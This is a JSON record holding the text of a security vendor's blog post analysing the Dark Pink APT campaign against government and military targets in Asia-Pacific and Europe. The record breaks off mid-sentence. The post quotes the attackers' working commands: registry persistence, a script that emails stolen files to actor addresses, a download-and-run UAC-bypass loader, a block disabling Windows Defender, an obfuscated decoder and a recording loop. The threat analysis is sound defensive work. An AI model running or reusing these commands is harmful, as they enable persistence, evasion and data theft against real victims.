{
    "id": "ac461d66-5315-4710-a461-82b83cde75e9",
    "created_at": "2023-02-02T02:07:20.297984Z",
    "updated_at": "2025-03-27T02:16:16.974245Z",
    "deleted_at": null,
    "sha1_hash": "bbd0cc80aab5bc184ffea6f01d3e8393213b7e20",
    "title": "2023-01-11 - Dark Pink - New APT hitting Asia-Pacific, Europe that goes deeper and darker",
    "authors": "",
    "file_creation_date": "2023-02-01T07:47:06Z",
    "file_modification_date": "2023-02-01T07:47:06Z",
    "file_size": 2234619,
    "plain_text": "# Dark Pink\n\n**blog.group-ib.com/dark-pink-apt**\n\n11.01.2023\n\nNew APT hitting Asia-Pacific, Europe that goes deeper and darker\n\nAndrey Polovinkin\n\nMalware Analyst\n\nAcknowledgements\n\n\n-----\n\nWe would like to specifically thank Albert Priego, Malware Analyst at Group-IB, for\ndiscovering the first Dark Pink attacks and for conducting the initial research into this\nparticular threat actor. His efforts made a major contribution to this blog and for our future\nresearch into this APT group.\n\n**Introduction**\n\nCountries of the Asia-Pacific region have long been the target of advanced persistent threat\n(APT) groups. [Earlier Group-IB research found that this region has often been a “key arena”](https://explore.group-ib.com/htct/hi-tech_crime_2020#page=1)\nof APT activity, and a mixture of nation-state threat actors from China, North Korea, Iran, and\nPakistan have been tied to a wave of attacks in the region. More often than not, the primary\nmotive for APT attacks in the Asia-Pacific (APAC) region is not financial gain, but rather\nespionage.\n\nGroup-IB continuously explores and analyzes the methods, tools, and tactics used by some\nof the world’s most prominent APT groups, [such as APT41, but how can large-scale](https://blog.group-ib.com/apt41-world-tour-2021)\ncompanies and organizations protect themselves when a new APT group emerges, or, if an\nalready existing APT group begins to utilize a completely new toolkit. Enter Dark Pink.\n\nDark Pink is the name given by Group-IB to a new wave of APT attacks that has struck the\nAPAC region. At the present time, Group-IB cannot attribute the campaign to any known\nthreat actor, making it highly likely that Dark Pink is an entirely new APT group. Bearing this\nin mind, we will refer to Dark Pink as an APT group throughout the entirety of this text. The\nname Dark Pink was coined by forming a hybrid of some of the email addresses used by the\n[threat actors during data exfiltration. The APT group has also been termed Saaiwc Group by](https://mp.weixin.qq.com/s/G3gUjg9WC96NW4cRPww6gw)\nChinese cybersecurity researchers.\n\nThere is evidence to suggest that Dark Pink began operations as early as mid-2021,\nalthough the group’s activity surged in mid-to-late 2022. To date, Group-IB’s sector-leading\nThreat Intelligence uncovered seven confirmed attacks by Dark Pink. The bulk of the attacks\nwere carried out against countries in the APAC region, although the threat actors spread\ntheir wings and targeted one European governmental ministry. The confirmed victims include\ntwo military bodies in the Philippines and Malaysia, government agencies in Cambodia,\nIndonesia and Bosnia and Herzegovina, and a religious organization in Vietnam. Group-IB\nalso became aware of an unsuccessful attack on a European state development agency\nbased in Vietnam. In line with Group-IB’s zero tolerance policy to cybercrime, confirmed and\npotential victims of Dark Pink were issued proactive notifications, and we note that the list of\ncompanies breached by this particular APT group is likely to be longer.\n\nGroup-IB’s early research into Dark Pink has revealed that these threat actors are leveraging\na new set of tactics, techniques, and procedures rarely utilized by previously known APT\ngroups. They leverage a custom toolkit, featuring TelePowerBot, KamiKakaBot, and Cucky\n\n\n-----\n\nand Ctealer information stealers (all names dubbed by Group-IB) with the aim of stealing\nconfidential documentation held on the networks of government and military organizations.\nOf particular note is Dark Pink’s ability to infect even the USB devices attached to\ncompromised computers, and also its ability to gain access to messengers on infected\nmachines. Furthermore, Dark Pink threat actors utilize two core techniques: DLL SideLoading and executing malicious content triggered by a file type association (Event Triggered\nExecution: Change Default File Association). The latter of these tactics is one rarely seen\nutilized in the wild by threat actors.\n\nAt the time of writing, Dark Pink is still active. Given the fact that many of the attacks\nidentified by Group-IB researchers took place in the final months of 2022, Group-IB\nresearchers are still in the process of identifying the full scope of the APT attack, and efforts\nto uncover the origin of this APT group are in process. However, we believe that this\npreliminary research, which will be of great interest to CISO, heads of cybersecurity teams,\nSOC analysts and incident response specialists, will go a long way to raising awareness of\nthe new TTPs utilized by this threat actor and help organizations to take the relevant steps to\nprotect themselves from a potentially devastating APT attack.\n**Key findings**\n\nDark Pink launched seven successful attacks against high-profile targets between June\nand December 2022.\n\nDark Pink’s first activity, which we tie to a Github account leveraged by the threat\nactors, was recorded in mid-2021, and the first attack attributable to this APT group\ntook place in June 2022. Their activity peaked in the final three months of 2022 when\nthey launched four confirmed attacks.\n\nDark Pink’s victims are located in five APAC countries (Vietnam, Malaysia, Indonesia,\nCambodia, Philippines) and one European country (Bosnia and Herzegovina).\n\nVictims included military bodies, government and development agencies, religious\norganizations, and a non-profit organization.\n\nOne unsuccessful attack was launched against a European state development agency\nbased in Vietnam in October 2022.\n\nDark Pink APT’s primary goals are to conduct corporate espionage, steal documents,\ncapture the sound from the microphones of infected devices, and exfiltrate data from\nmessengers.\n\nDark Pink’s core initial vector was targeted spear-phishing emails that saw the threat\nactors pose as job applicants. There was evidence to suggest that the threat actors\nbehind Dark Pink scanned online job vacancy portals and crafted unique emails to\nvictims that were advertising vacancies.\n\n\n-----\n\nAlmost all the tools leveraged by the threat actors were custom and self-made,\nincluding TelePowerBot and KamiKakaBot, along with the Cucky and Ctealer stealers.\nDuring our investigation, we noticed only one public tool: PowerSploit/GetMicrophoneAudio.\n\nDark Pink APT utilized a rarely seen technique, termed Event Triggered Execution:\nChange Default File Association, to ensure launch of malicious TelePowerBot malware.\nAnother technique leveraged by these particular threat actors was DLL Side-Loading,\nwhich they used to avoid detection during initial access.\n\nThe threat actors created a set of PowerShell scripts to carry out communication\nbetween victim and threat actors’ infrastructure, facilitate lateral movement and network\nreconnaissance.\n\nAll communication between infected infrastructure and the threat actors behind Dark\nPink is based on Telegram API.\n\n**Dark Pink takes on all comers**\n\nThe attacks carried out by this particular APT group have been advanced in every sense of\nthe word. They have utilized a sophisticated mixture of custom tools to breach the defenses\nof multiple government and military organizations. The first attack Group-IB analysts were\nable to attribute to this APT group was registered on a religious organization in Vietnam in\nJune 2022. However, they appear to have been active well before that, as Group-IB\nresearchers identified a Github account used by these threat actors which showed activity\ndating back to mid-2021. According to our research, the malware initialized by the threat\nactors can issue commands for an infected machine to download modules from this\nparticular Github account. Interestingly, the threat actors appeared to use only one Github\naccount for the entire duration of the campaign to date, which could suggest that they have\nbeen able to operate without detection for a significant period of time.\n\n\n-----\n\n_Figure 1: Screenshot detailing activity on Github account attributed to Dark Pink APT in 2021_\n_(above) and 2022 (below)_\n\nFollowing the June 2022 attack, Group-IB researchers were unable to attribute any other\nmalicious activity to Dark Pink. However, this APT group burst into life towards the end of the\nsummer, when Group-IB noticed an attack on a Vietnamese non-profit organization in August\n2022 bearing all the hallmarks of the June attack. From then, Group-IB was able to attribute\none attack in September, two attacks (one successful, one unsuccessful) in October, two in\nNovember, and one in December. Most recently, Group-IB discovered that Dark Pink was\nable to breach an Indonesian governmental organization on December 8, 2022.\n\n\n-----\n\n_Figure 2: Dark Pink APT timeline and targets_\n\n**Kill Chain**\n\nThe sophistication of the Dark Pink campaign is evidenced by its multiple distinct kill chains.\nThe threat actors behind this wave of attacks were able to craft their tools in several\nprogramming languages, giving them flexibility as they attempted to breach defense\ninfrastructure and gain persistence on victims’ networks. As a result, we will discuss the\ndifferent steps and stages of these processes, but it is important to note that the bulk of the\nattacks were based on PowerShell scripts or commands that aimed to launch communication\nbetween the infected networks and the threat actors’ infrastructure.\n\nInitial access was achieved by successful spear-phishing emails. These messages contained\na shortened link directing the victim to download a malicious ISO image, which in one case\nseen by Group-IB, was stored on the public, free-to-use sharing service MediaFire. Once the\nISO image was downloaded by the victims, Group-IB identified three distinct infection chains,\nwhich we will detail below.\n\nThe first thing that caught our attention was that all communication between the devices of\nthe threat actors and the victims was based on Telegram API. The custom modules created\nby the threat actors, TelePowerBot and KamiKakaBot, are designed to read and execute\ncommands via a threat actor-controlled Telegram bot. Interestingly, these modules were\n\n\n-----\n\ndeveloped in different programming languages. TelePowerBot is represented as PowerShell\nscript, while KamiKakaBot, which includes stealer functionalities, is developed on .NET. The\nthreat actors have used the same Telegram bots for a long period of time, as one has been\nused since September 2021.\n\nAdditionally, Dark Pink APT utilizes the self-made stealers Ctealer and Cucky to steal victim\ncredentials from web browsers. We will look at each of the above mentioned tools later in this\nreport. At this stage, we will turn to detailing each step of the infection chain.\n\n**Initial access**\n\nA large part of the success of Dark Pink was down to the spear-phishing emails used to gain\ninitial access. In one such attack, Group-IB was able to find the original email sent by the\nthreat actors. In this one instance, the threat actor posed as a job applicant applying for the\nposition of PR and Communications intern. In the email, the threat actor mentions that they\nfound the vacancy on a jobseeker site, which could suggest that the threat actors scan job\nboards and use this information to create highly relevant phishing emails.\n\nThe emails contain a shortened URL linking to a free-to-use file sharing site, where the victim\nis presented with the option to download an ISO image that contains all the files needed for\nthe threat actors to infect the victim’s network. During our investigation into Dark Pink, we\ndiscovered that the threat actors leveraged several different ISO images, and we also noted\nthat the documents contained in these ISO images varied from case to case. According to\nthe information available to us, we strongly believe that the Dark Pink threat actors craft a\nunique email to each victim, and we do not discount that the threat actors can send the\nmalicious ISO image as a direct attachment to the victim via email.\n\n\n-----\n\n_Figure 3: Screenshot of original spear-phishing email sent by Dark Pink APT noting the_\n_storage of the ISO image on a file-sharing site._\n\nThe ISO images sent in the spear-phishing emails contained varying numbers of files.\nHowever, there are three types of file found in all of the ISO images sent by the threat actors:\na signed executable file, a nonmalicious decoy document (e.g. .doc, .pdf, or .jpg), and a\nmalicious DLL file. Given that the email relates to a job opening, one can assume that the\nvictim will first look for the supposed applicant’s resume, which is often sent as a MS Word\ndocument. However, In Dark Pink attacks, the threat actors include an .exe file in the ISO\nimage that mimics a MS Word file. The file contains “.doc” in the file name and contains the\nMS Word icon as a means of confusing the victim and thinking that the file is safe to open.\n\n\n-----\n\n_Figure 4: Screenshot detailing the five files contained in one ISO image seen by Group-IB._\n_Note that the .doc and .dll files are in hidden view._\n\nShould the victim execute the .exe file first, the malicious DLL file, located in the same folder\nas the .exe file, will run automatically. This is a technique used by threat actors known as\n[DLL Side-Loading. The primary function of the DLL execution is to ensure that the threat](https://attack.mitre.org/techniques/T1574/002/)\nactors’ core malware, TelePowerBot, gains persistence. Before the completion of the file\nexecution, the decoy document (e.g. a letter, resume), is shown on the victim’s screen.\n**Trojan execution and persistence**\n\nOne of the most interesting discoveries for Group-IB researchers was the process of how\nTelePowerBot or KamiKakaBot are launched on the victim’s machine. As mentioned\npreviously, the malicious DLL file that contains one of these two pieces of malware can be\nlocated inside the ISO image that is sent during spear-phishing campaigns. In one case\nanalyzed by Group-IB, the threat actors used a chain of MS Office documents and leveraged\n[Template Injection, whereby the threat actors insert into the initial document a link to a](https://attack.mitre.org/techniques/T1221/)\ntemplate document that contains a malicious macro code. In two other cases examined by\nGroup-IB researchers, the threat actors behind Dark Pink launched their malware by the DLL\nSide-Loading technique. In total, we found three different kill chains leveraged by the threat\nactors, and we will detail them below.\n**Kill Chain 1: All-inclusive ISO**\n\nThe first variant of the infection chain results in an ISO image being sent to the victim\nthrough spear-phishing emails. This ISO image includes a malicious DLL file, which contains\nTelePowerDropper (name given by Group-IB). The primary goal of this DLL file is to gain\npersistence for TelePowerBot in the registry of the infected machine. In some cases, the DLL\nfile can also launch the threat actors' proprietary stealer Stealer, which parses data from\nbrowsers on the victim’s machine and stores it in a local folder. It is important to note that\nlaunching any kind of stealer is optional during initial access. Dark Pink can send special\ncommands to download and launch a stealer during all phases of attack.\n\n\n-----\n\n_Figure 5: Graphic detailing the full scheme of Kill Chain 1_\n\nIt is important to note at this stage that the DLL files are packed. When the file is launched, it\ndecrypts itself and passes control to an unpacked version of itself. Additionally, once the DLL\nfile is launched, a mutex will be created. One example of this was: gwgXSznM-Jz92k33AuRcCCksA-9XAU93r5. Upon completion of this step, a command to start TelePowerBot will\nbe added to autorun. This means that TelePowerBot will be launched each time the user logs\ninto their system. This is facilitated by creating a registry key by path\nHKCU\\Environment\\UserInitMprLogonScript. The value of the created key is as follows:\n```\nforfiles.exe /p %system32% /m notepad.exe /c \"cmd.exe /c whoami >> %appdata%\\a.abcd\n&& %appdata%\\a.abcd && exit\"\n\n\n```\nThe above code reveals that the command launches a standard utility, whoami, which shows\ninformation about the current user of the machine. The output is redirected to a file and\nexecution is finished.\n\nAt this point it might not be entirely clear how the next stage, and the launching of\nTelePowerBot, begins. The key to this answer is the file extension .abcd. In short, the threat\nactors create a file with this extension name as part of a technique termedEvent Triggered\n\n\n-----\n\n[Execution: Change Default File Association. The idea is to add a handler to work with the](https://attack.mitre.org/techniques/T1546/001/)\nunrecognized file extension in the registry key tree. This is detailed in the below screenshot.\n\n_Figure 6: Screenshot detailing command to run upon creation of file with extension .abcd_\n\nThe above screenshot details part of a PowerShell command that is triggered when a file is\ncreated with the specific extension .abcd. The PowerShell commands are stored in base64\nview and are highly obfuscated. The result of these commands are relatively simple: read\nregistry key, decrypt, and launch TelePowerBot.\n\n**Kill Chain 2: Github macros**\n\nThe second variation of the infection chain is almost identical to the preceding one. The only\nthing that differs is the file used in the initial stage. During our analysis, we discovered that\nthe threat actors used commands to automatically download a malicious template document\ncontaining TelePowerBot from Github upon opening of the .doc contained in the initial ISO\nfile. Macro code written into this template document then works to ensure persistence for the\nmalware.\n\n\n-----\n\n_Figure 7: Graphic detailing the full scheme of Kill Chain 2_\n\nIn this instance, the ISO image sent to the victims contains a MS Word document that leads\nto the automatic download of a malicious template document, which contains TelePowerBot,\nfrom Github. In order to evade antivirus defenses on an infected machine during initial\naccess, macro code is written into the template document. This technique is known as\n[Template Injection. The macro contains several forms with fields, and during execution, the](https://attack.mitre.org/techniques/T1221/)\nvalue of these form fields are read and established as a value in registry keys.\n\nThis trick can help the malware avoid detection by antivirus software, as the document itself\ndoes not contain any malicious functionalities or code. The coded documents contain forms\nwith several parameters, and the macros contained in these files can read these values and\nwork to ensure persistence of TelePowerBot on the victim’s machine.\n\n_Figure 8: Screenshot detailing two forms contained predefined keys and values that are_\n_written to the registry by the malicious macro code written into the MS Word file sent to_\n_victims_\n\n**Kill Chain 3: X(ML) marks the spot**\n\n\n-----\n\nThe third and final kill chain variant that we will detail is one that was used in the most recent\nDark Pink attack analyzed by Group-IB, which saw the threat actors breach the network of\nan Indonesian government agency on December 8, 2022. The ISO image sent to the victim\nin a spear-phishing email contained decoy documents, a signed legitimate MS Word file, and\na malicious DLL named KamiKakaDropper. The primary goal of this infection vector is to\npersist KamiKakaBot on infected machines. In this kill chain, an XML file is located at the end\nof the decoy document in encrypted view. The malicious DLL file is, as in Kill Chain 1,\nlaunched by the DLL Side-Loading technique. Once the DLL file is launched, the XML file\nthat kicks off the next stage of the kill chain will be decrypted from the decoy document and\nsaved in the infected machine.\n\n_Figure 9: Graphic detailing the full scheme of Kill Chain 3_\n\nThe XML file contains an MSBuild project that includes a task to execute .NET code. To find\n[more about how this process works, please refer to the following Microsoft documentation.](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-tasks?view=vs-2022)\nThe logic of the .NET code is simple: launch KamiKakaBot, which itself is located in the XML\nfile (packed and encoded in base64 format). After this file is unpacked, control is passed to\nKamiKakaBot\n\n\n-----\n\n_Figure 10: Snippet of code inside XML file that unpacks and launches KakaKamiBot_\n\nThe path to the XML file is passed as an argument upon the launch of MSBuild. The\ncommand to run MSBuild is located in the registry key\n(HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell), which is\ncreated during execution of the DLL file. Once this step is completed, MSBuild will run each\ntime a user logs on to the system. In addition, the DLL creates a repeatable task to log the\nvictim off from the system.\n\n**Reconnaissance and lateral movement**\n\nAfter infecting a computer in the victim organization’s network, the next goal for Dark Pink is\nto collect as much information as possible about the victim’s network infrastructure. From our\nanalysis, we see that the threat actors are interested in the following:\n\ninformation from standard utility, e.g output of standard utility systeminfo.\ninformation from web browsers.\ninstalled software, including antivirus solutions.\ninformation about connected USB devices and network sharing.\n\nThe threat actors also collect a list of network and USB drives that are available for writing,\nand these are then used for lateral movement. Next, instead of the original file, the attack\nsees the creation of a LNK file (Windows shortcut) with a command to launch\nTelePowerDropper. At this stage, the original files are hidden from the user.\n\nOne of the most interesting revelations of our investigation into Dark Pink was how the threat\nactors carry out lateral movement over USB devices. For this, a new WMI event handler is\nregistered. From this point onwards, each time a USB flash drive is plugged into an infected\nmachine, a specific action will be executed that sees TeleBotDropper downloaded and stored\non the flash drive. Let’s analyze this process a little deeper.\n\n\n-----\n\n1\n\nVictim plugs USB flash drive into infected device\n\n2\n\nThe WMI event is triggered, and results in the automatic download of a .ZIP archive\nfrom the threat actors’ Github account. There are three files inside this archive:\nDism.exe, Dism.sys, and Dismcore.dll. The first of these files is a legitimate file with a\nvalid digital signature. The functionality of the DLL file is to unpack the original\nexecutable from file Dism.sys.\n\n3\n\nArchive is extracted to %tmp% folder. The files are then copied to the USB device,\nwhere a new folder named “dism” is created. The folder attribution is changed to\nhidden and system.\n\n4\n\nA file named system.bat is created, containing a command to launch Dism.exe\n\n5\n\nFinally, as many LNK files are created as there are folders on the USB drive. The\nattributes of the original folder are changed to hidden and system. A LNK file is created\nwith a command to open the hidden folder in explorer.exe and launch system.bat.\n\nFollowing this process, the user will see LNK files bearing the same name as folders found\non the USB device. Once the user opens this malicious LNK file, TeleBotDropper will be\nlaunched by the DLL Side-Loading technique (the functionalities of TeleBotDropper have\nbeen already shown in the previous section). As a result, the commands, which read registry\nkey, decrypt, and launch TelePowerBot, are then transferred to a new machine. It is\nimperative to remember that this solution works if there is only one folder on the USB device.\nThis is why we observed different implementations, for example, the creation of LNK files\ninstead of .pdf files (not only for folders) on USB devices. An example of how this works in\nmore detail is provided in APPENDIX B. The mechanism of creating LNK files in place of the\noriginal files is also used for network sharing.\n**Data exfiltration**\n\nAs is the case with many other attacks of this kind, the threat actors exfiltrate data through\nZIP archives. During Dark Pink attacks, all data (list of files from common network shares,\nweb browser data, documents, etc.) that is to be sent to the threat actors is stacked in the\n$env:tmp\\backuplog folder. However, the collection and sending process operate separately\nfrom one another. When the infected machine is issued a command to download the\n\n\n-----\n\n$env:tmp\\backuplog folder, the list of files will be copied to $env:tmp\\backuplog1 folder,\nadded to archive and sent to the threat actors’ Telegram bot. After this step is completed, the\n$env:tmp\\backuplog1 directory is deleted.\n\nDark Pink threat actors can also leverage their self-made stealers Cucky and Ctealer to draw\ndata from infected machines. The functionalities of both of these stealers are the same. They\ncan be used to extract data such as passwords, history, logins, andcookies from web\nbrowsers. The stealers themselves do not require any internet connection, as they save the\nresult of the execution (stolen data) to files. Both of the stealers can be downloaded from the\nthreat actors’ Github account automatically by commands issued by the malware. An\nexample of the script used to launch Cucky is shown in APPENDIX C.\n\nIn total, Group-IB researchers discovered that Dark Pink exfiltrated files via three separate\npathways. The first of these pathways sees the threat actors use Telegram to receive files.\nAs a device is infected, information is collected in a specific folder by the malware and sent\nvia Telegram by a special command. By extension, the files that are sent to the threat actors\nare: .doc, .docx, xls,.xlsx,.ppt,.pptx,.pdf. An example of a script that carries out this process\ncan be found in APPENDIX D.\n\nIn addition to Telegram, Group-IB found evidence that the threat actors exfiltrated files via\nDropbox. This method is slightly different to the one used to exfiltrate via Telegram, as it\ninvolves a series of PowerShell scripts that transfer files from a specific folder to a Dropbox\naccount by performing a HTTP request with a hardcoded token.\n\nOne particular attack discovered by Group-IB was of particular surprise to us. Despite the\ndevice being controlled by commands issued by a threat actor-controlled Telegram channel\nvia Telegram bots, some interesting files were sent via email. An example of this command is\nshown below.\n```\n$filepath=\"$env:tmp/backuplog\";\n\n$cred = New-Object System.Management.Automation.PSCredential\n(\"lanhuong.jsc@outlook.com\",(ConvertTo-SecureString \"CHANGED\" -AsPlainText -Force));\n\nSend-MailMessage -To \"blackpink.301@outlook[.]com\" -From \"blackred.113@outlook[.]com\"\n\n  -Body \"hello badboy\" -SmtpServer \"smtp-mail.outlook.com\" -Port 587\n\n  -Subject \"$env:computername\" -UseSsl -Credential $cred\n\n  -Attachments (gci $filepath).fullname\n\n\n```\nThe list of emails used during data exfiltration are shown below:\n\n_blackpink.301@outlook[.]com_\n\n_alibaba.113@outlook[.]com_\n\n_alibaba.113@outlook[.]com.vn_\n\n\n-----\n\n_blackred.113@outlook[.]com_\n_lanhuong.jsc@outlook[.]com_\n\n_nphuongmai.97@outlook[.]com_\n\nAt this stage, Group-IB researchers believe that the exfiltration method of choice depends on\nthe potential restrictions set out in the victim’s network infrastructure.\n\n**Evasion techniques**\n\nDuring their attacks, the threat actors used an already known technique to bypass User\nAccount Control (UAC) to alter the settings in Windows Defender. They did this by elevating\nthe COM interface. The methods used are not unique and different implementations were\nfound in different programming languages.\n\nFigure 11: Screenshot of decompiled executable that allows UAC to be bypassed\n\nThe settings are changed by a special PowerShell script which is received as a command,\nand implemented in .NET application. This command comes in the form of an executable file\n(in base64 view) that is automatically downloaded from Github upon infection. The\nexecutable does not gain persistence nor is it saved on an infected system. The executable\ndoes not persist and is not saved into an infected system. An example of downloading and\nlaunching are shown below.\n```\n[Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object\nSystem.Net.WebClient).DownloadString(URL)));\n\n[NETLUA.Main]::BypassUAC(\"powershell\\\", \\\"-c {$command}\")\n\n\n```\nThe PowerShell command to modify Windows Defender Settings is passed as an argument\nand is shown as follows:\n\n\n-----\n\n```\nSet-MpPreference -DisableArchiveScanning $true -ea 0;\n\nSet-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0;\n\nSet-MpPreference -DisableCatchupFullScan $true -Force -ea 0;\n\nSet-MpPreference -DisableCatchupQuickScan $true -Force -ea 0;\n\nSet-MpPreference -DisableIntrusionPreventionSystem $true -Force -ea 0;\n\nSet-MpPreference -DisableIOAVProtection $true -Force -ea 0;\n\nSet-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0;\n\nSet-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0;\n\nSet-MpPreference -DisableRestorePoint $true -Force -ea 0;\n\nSet-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0;\n\nSet-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0;\n\nSet-MpPreference -DisableScriptScanning $true -Force -ea 0;\n\nSet-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0;\n\nSet-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0;\n\nSet-MpPreference -MAPSReporting Disabled -Force -ea 0;\n\nSet-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0;\n\nSet-MpPreference -PUAProtection Disabled -Force -ea 0\n\n```\nThe PowerShell commands will be executed using the .NET application as a tool for privilege\nescalation.\n\n**TOOLS**\n\nCucky\n\nCucky is a simple custom stealer developed on .NET. A variety of samples were found during\nthe investigation. The most analyzed versions were packed by Confuser. It does not\ncommunicate with the network, and collected information is saved in the folder\n%TEMP%\\backuplog. Cucky is able to draw data such as passwords, history, logins, and\ncookies from targeted web browsers. Although we do not have any information related to the\nuse of stolen data, we suppose that it can be used to gain access to email web clients,\nconduct additional infrastructure reconnaissance based on web history, compile a list of\norganization employees, distribute malicious attachments, and assess whether the\ncompromised machine is real or virtual.\n\nCucky has the functionality to steal data from the following browsers:\n\nChrome, MS Edge, CocCoc, Chromium, Brave, Atom, Uran, Sputnik, Slimjet, Epic Privacy,\nAmigo, Vivaldy, Kometa, Comodo, Nichrome, Maxthon, Comodo Dragon, Avast Browser,\nYandex Browser.\n\n\n-----\n\n_Figure 12: Screenshot of decompiled Cucky stealer_\n\nThe sample found contained the path below to debug information:\n```\nC:\\Users\\hoang\\source\\repos\\Cucky\\Cucky\\obj\\Release\\net46\\Cucky.pdb\n\n\n```\nCtealer\n\nCtealer is an analog of Cucky but developed on C/C++. TelePowerDropper or a special\ncommand issued by the threat actors can be used to deploy Ctealer. The working process is\npretty similar to Cucky as well, as it also saves collected files to the %TEMP%\\backuplog\nfolder. Ctealer can draw information from the following web browsers:\n\nChrome, Chromium, MS Edge, Brave, Epic Privacy, Amigo, Vivaldi, Orbitum, Atom, Kometa,\nDragon, Torch, Comodo, Slimjet, 360 Browser, Maxthon, K-Melon, Sputnik, Nichrome,\nCocCoc, Uran, Chromodo, Yandex Browser.\n\nThe sample found contained the path below to debug information:\n```\nC:\\Users\\build\\source\\repos\\CtealWebCredential\\Release\\CtealWebCredential.pdb\n\n\n```\nTelePowerBot\n\nAs we have already noted, TelePowerBot will be launched every time a user of an infected\nmachine logs into the system. When this happens, a special script will be launched. The\nscript reads the value of another regkey (e.g\nHKCU\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd), which begins decryption and launch of\nTelePowerBot. The encryption is based on xor where the key is an array number from 0 to\n256. Before decryption, the original payload will be decoded from base64. The deobfuscated\ncommand example is shown below:\n\n\n-----\n\n```\niex(\n\n [System.Text.Encoding]::UTF8.GetString(\n\n          ([System.Convert]::FromBase64String(\n\n              (gp \"HKCU:\\\\SOFTWARE\\\\Classes\\\\abcdfile\\\\shell\" -Name\n\"abcd\").\"abcd\") | % -Begin{$i=0} -Process{\n\n                   $_ = $_ -bxor $i%256;$i++;$_\n\n              }\n\n          )\n\n     )\n\n) | iex\n\n```\nThe decrypted stage is not final. It is an intermediate stage and also is based on PowerShell\nand is highly obfuscated. At this stage, the final script has already been stored in the stager\nbut it is separated into blocks. From this, a base64 string is created, and after decoding, we\nwill be left with a ZIP stream. Finally, after all this, TelePowerBot is launched after unzipping.\n\nThis kind of tool communicates with a Telegram channel to receive new tasks from the threat\nactors. The bot can communicate with various infected devices, and the bot checks for new\ncommands every 60 seconds. During execution, the bot works with two register keys:\nHKCU\\Environment\\Update and HKCU\\Environment\\guid. The first one stores the last\nmessage id, which is processed from the Telegram bot (The parameter update_id from\nTelegram). The second key stores the unique identification of infected machines. It is\ngenerated by command [guid]::NewGuid() when the bot launches for the first time. Upon\nregistration, the threat actors get various pieces of information about the infected machine\nsuch as ip, guid, computer name. The IP address is also ascertained via a get request to\n[https://ifconfig.me/ip. These processes are also based on PowerShell commands, and we](https://ifconfig.me/ip)\nwill dig a little deeper into those later in the report. The bot implementation is shown in\nAPPENDIX A.\nSome variants of this module contain additional functionality for ensuring lateral movement.\nAll other functionalities are the same. In cases that Group-IB analyzed, the Telegram\nparameter can either be hardcoded in the scripts or read from the registry key.\n\nKamiKakaBot\n\nKamiKakaBot is the .NET version of TelePowerBot, and we found very few differences\nbetween the pair of them. Before commands are read, KamiKakaBot is able to exfiltrate from\nthe Chrome, MS Edge, and Firefox browsers. It is able to update itself and once it receives\ncommands, it can pass an argument to the cmd.exe process.\n\n\n-----\n\n_Figure 13: Screenshot detailing decompiled executable that contains KamiKakaBot_\n\nPowerSploit/Get-MicrophoneAudio\n\nAs we have noted above, the threat actors behind Dark Pink almost exclusively leveraged\ncustom made tools. However, to record the microphone audio from infected devices, they\nturned to a publicly available PowerSploit module - Get-MicrophoneAudio. This is loaded\nonto the victim’s machine via download from Github. Group-IB researchers found that\nantivirus software on victim machines blocked this process when the threat actors attempted\nto launch the module. We found that the threat actors attempted to obfuscate the original\nPowerSploit module to make it undetectable, and these were unsuccessful. As a result, the\nthreat actors returned to the drawing board and added a script (below) that was successfully\nable to record the microphone audio on infected devices.\n```\nStart-Job {\n\n while(1){\n\n     ps psr -erroraction 'silentlycontinue' | kill -force;sleep 30;\n\n     ni \"$($env:tmp)\\\\record\" -ItemType Directory -erroraction 'silentlycontinue';\n\n     start psr -ArgumentList \"/start /output $($env:tmp)\\\\record\\\\$((getdate).tostring('yyyyMMddHHmmss')).zip /sc 1 /gui 0\";\n\n     sleep 60;\n\n     start psr -ArgumentList \"/stop\"\n\n }\n\n}\n\n\n```\nThis simple script launches a background task that triggers a standard utility PSR to capture\nsound every minute. The recorded audio files will be saved inside a ZIP archive that is\nlocated in a temporary folder (%TEMP%\\record). The files are named according to the\nfollowing template: 'yyyyMMddHHmmss'. These audio files are then exfiltrated with a\nseparate script that sends them (as a ZIP archive), to the threat actors’ Telegram bot.\n\nZMsg (Messenger exfiltration)\n\n\n-----\n\nThe threat actors are also interested in stealing data from messengers on infected devices.\nTo this end, they are able to execute commands to identify leading messengers, such as\nViber, Telegram, and Zalo. In the case of Viber, these commands allow the threat actors to\nexfiltrate the %APPDATA%\\Viberpc folder on infected devices, which allows them to gain\naccess to the messages and contact lists of the victims. We are still doing work to assess\nwhat the threat actors are able to draw from Telegram accounts on infected devices, but the\ncase of Zalo is one that piqued our interest.\n\nIf Zalo messenger is present on the victim’s device, the threat actors can launch a command\nto download a special utility (dubbed ZMsg by Group-IB), from Github. This utility, which is a\n.NET application based on the FlaUI library, allows the threat actors to exfiltrate the victim’s\nmessages on the Zalo platform. FlaUI is a library that assists with the automatic UI testing of\nWindows applications, with the entry point usually an application or the desktop to generate\nan automation element. Through this, it is possible to analyze sub-elements and interact with\nthem.\n\nZMsg iterates elements on Windows applications to discover those with particular names.\nFor example, the element with messages has the name “messageView”. All collected\ninformation is stored in the %TEMP%\\KoVosRLvmU\\ folder in files with the .dat and .bin\nextensions. File names are created as an encoded hex string, and are generated in\naccordance with the below template:\n\n%PERSON_NAME%_%DAY%_%MONTH%_%YEAR%\n**Commands**\n\nThe threat actors issue commands to an infected device by specifying ip, computer name, or\nbotid. Tasks can also be issued to all infected devices simultaneously. During our\nexamination, we noticed several different kinds of commands. The functionalities of some of\nthese commands overlap, but they are based on PowerShell commands. For example,\nTelePowerBot can execute a simple standard console tool, such as whoami, or a complex\nPowerShell script.\n\nDuring infection, the threat actors execute several standard commands (e.g. net share, GetSmbShare) to determine what network resources are connected to the infected device. If\nnetwork disk usage is found, they will begin exploring this disk to find files that may be of\ninterest to them and potentially exfiltrate them. In the prior section, we noted how Dark Pink\nthreat actors carry out lateral movement. In this campaign, the threat actors can also infect\nfiles on USB disks attached to the infected devices. The script below details how the threat\nactors compile a list of network shares and the removable devices connected to 